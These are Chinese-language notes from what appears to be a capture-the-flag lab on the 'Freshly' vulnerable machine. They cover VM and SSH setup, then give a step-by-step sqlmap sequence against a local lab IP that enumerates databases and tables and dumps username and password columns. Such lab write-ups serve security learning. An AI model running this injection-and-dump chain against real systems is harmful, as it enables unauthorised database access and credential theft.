# 参考
* https://www.freebuf.com/column/162631.html
* https://www.jianshu.com/p/63becdb8c2f8
# 一些环境问题
* 破解密码(为什么要破解是当时俩台虚拟机不在同一个虚拟软件上一直没有扫到对应mac的主机)。
* 1.在没有进入引导前光标切进去长按shift进入grub。
* 2.安装open-server 
* sudo apt-get update 
*  sudo apt-get install openssh-server  
* ps -e | grep ssh
* sudo /etc/init.d/ssh resart
* 3.开启ssh root登录。
* 4.用tcpdump
* tcpdump -D 
* tcpdump -i eth0 -w file.cap
* 5.用scp
* scp root@107.172.27.254:/home/test.txt .   //下载文件
* 
* scp test.txt root@107.172.27.254:/home  //上传文件
* 
* scp -r root@107.172.27.254:/home/test .  //下载目录
* 
* scp -r test root@107.172.27.254:/home   //上传目录
* 6.鞋机我这只能用vmbox打开了，vmware是一直报错，然后俩个不同的虚拟机可能网段不一样，按理全选桥接应该是一个网段的但是有时也不一样，我就一直重启直到俩个虚拟机网段一样，实现不行用vmbox也跑kali(vmware桥接无法分配ip 找到编辑->虚拟机网络编辑器->找到桥接模式那一行的外部链接要选种主机的网卡)。
* 7.鞋机apache2服务器有问题，8080与443端口没打开，我就直接翻他的配置文件了，在 /etc/apache2/sites-available/000-default.conf 中有 /var/www/html。
* 8.sqlmap无法更新
* 解决方法： 找到sqlmap的路径/usr/share/salmap
* 
* 执行 cd /usr/share/
* 
* 然后删掉sqlmap   rm -rf sqlmap/
* 
* 然后执行 git clone https://github.com/sqlmapproject/sqlmap
* 
* 克隆到路径即可。

# sqlmap 语句
* 开始扫描漏洞
* sqlmap -u "http://192.168.0.174/login.php" --form --level 3
* 开始扫描数据库
* sqlmap -u "http://192.168.0.174/login.php" --form --level 3 --dbs
* 指定数据库扫数据库表
* sqlmap -u "http://192.168.0.174/login.php" --form --level 3 -D wordpress8080 --tables
* 指定数据库表扫字段
* sqlmap -u "http://192.168.0.174/login.php" --form --level 3 -D wordpress8080 -T users--columns
* 指定字段dump表
* sqlmap -u "http://192.168.0.174/login.php" --form --level 3 -D wordpress8080 -T users -C "password,username" --dump
* ![avatar](https://github.com/haidragon/NetworkTrafficAnalysis/blob/master/ctf/Freshly/images/user-pass.png)
* ![avatar](https://github.com/haidragon/NetworkTrafficAnalysis/blob/master/ctf/Freshly/images/sqlmap.png)
